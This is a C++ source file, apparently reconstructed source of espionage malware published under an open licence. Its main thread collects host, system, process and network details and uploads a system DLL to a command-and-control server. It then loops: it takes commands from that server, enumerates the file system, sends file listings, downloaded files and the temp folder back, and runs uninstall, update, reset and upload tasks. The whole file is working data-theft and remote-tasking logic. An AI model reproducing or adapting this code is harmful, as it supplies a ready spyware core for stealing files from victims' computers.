// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "core.hpp"

#include <iostream>
#include "StdAfx.hpp"
#include "network_info.hpp"
#include "setup.hpp"
#include "config.hpp"
#include "c2.hpp"
#include "EnumFS.hpp"
#include "recursive.hpp"

DWORD __stdcall g_fnThread1(LPVOID lpThreadParameter)
{
	// --------------- GET GENERAL INFO ---------------
	GetHostInfo(g_szHostname, 260, g_szHostByName);
	GetVolumeSerialNumber(g_szVolumeSerialNr, 260);

	DWORD nWaitTime = 60000 * g_nDownCmdTime;
	DWORD nTimeEnd = 0;

	char szSysDir[260];
	char szSystem_T[260];

	GetSystemDirectory(szSysDir, 260);
	sprintf(szSystem_T, "%s\\system_t.dll", szSysDir);

	GetSystemTechnicalInfo();
	GetProcessList();
	GetNetworkInfo();

	// --------------- SYSTEM_T.DLL ---------------
	SYSTEMTIME lpSysTime;
	GetLocalTime(&lpSysTime);

	char szTravLibPath[260];
	sprintf(szTravLibPath,
		"travlerbackinfo-%d-%d-%d-%d-%d.dll",
		lpSysTime.wYear,
		lpSysTime.wMonth,
		lpSysTime.wDay,
		lpSysTime.wHour,
		lpSysTime.wMinute
	);

	LoadProxyConfig();
	if (TRUE == SendFileToC2(szSystem_T, szTravLibPath))
	{
		Sleep(10);
		DeleteFile(szSystem_T);
	}

	// --------------- MAIN ROUTINE ---------------
	while (1)
	{
		LoadProxyConfig();

		DWORD nTimeBegin = GetTickCount();
		if (nTimeBegin < nTimeEnd)
			nTimeEnd = 0;

		if (nTimeBegin - nTimeEnd >= nWaitTime && GetCMDFromC2() && SendCMDRecvToC2())
		{
			DeleteFile(g_szDNList);
			if (TRUE == PropagateConfig())
			{
				DeleteFile(g_szStat_T);
				LoadProxyConfig();
			}

			nTimeEnd = GetTickCount();
		}

		GenerateEnumFS();
		if (TRUE == SendEnumFSToC2())
			DeleteFile(g_szEnumFS);

		SendDNListFilesToC2();
		if (TRUE == SendUEnumFSToC2())
			DeleteFile(g_szUEnumFS);

		SendTmpFolderToC2();

		int nTask = GetTaskFromC2();
		if (nTask == TASK_UNINSTALL)
		{
			break;
		}
		else if (nTask == TASK_UPDATE)
		{
			RemoveALL();
			TaskUpdate();
		}
		else if (nTask == TASK_RESET)
		{
			TaskReset();
		}
		else if (nTask == TASK_UPLOAD)
		{
			TaskUpdate();
		}

		Sleep(60000);
	}

	// --------------- EXIT ROUTINE ---------------
	while (FALSE == RemoveALL())
		Sleep(60000);

	HeapFree(GetProcessHeap(), 0, NULL);

	char szReqURL[260];
	sprintf(szReqURL, "%s", g_szWebPage);
	strcat(szReqURL, "?action=updated&hostid=");
	strcat(szReqURL, g_szVolumeSerialNr);

	DWORD dwSize = 0;
	HeapFree(GetProcessHeap(), 0, GetFromURL(szReqURL, &dwSize));

	g_bUninstall = TRUE;

	return 0;
}

void TaskReset()
{
	DeleteFile(g_szEnumFS);
	DeleteFile(g_szDNList);
	DeleteFile(g_szUDIdx);
	DeleteFile(g_szUEnumFS);
	DeleteFile(g_szStat_T);

	char szURL[260];
	sprintf(szURL, "%s", g_szWebPage);
	strcat(szURL, "?action=updated&hostid=");
	strcat(szURL, g_szVolumeSerialNr);

	DWORD dwSize;
	HeapFree(GetProcessHeap(), 0, GetFromURL(szURL, &dwSize));
}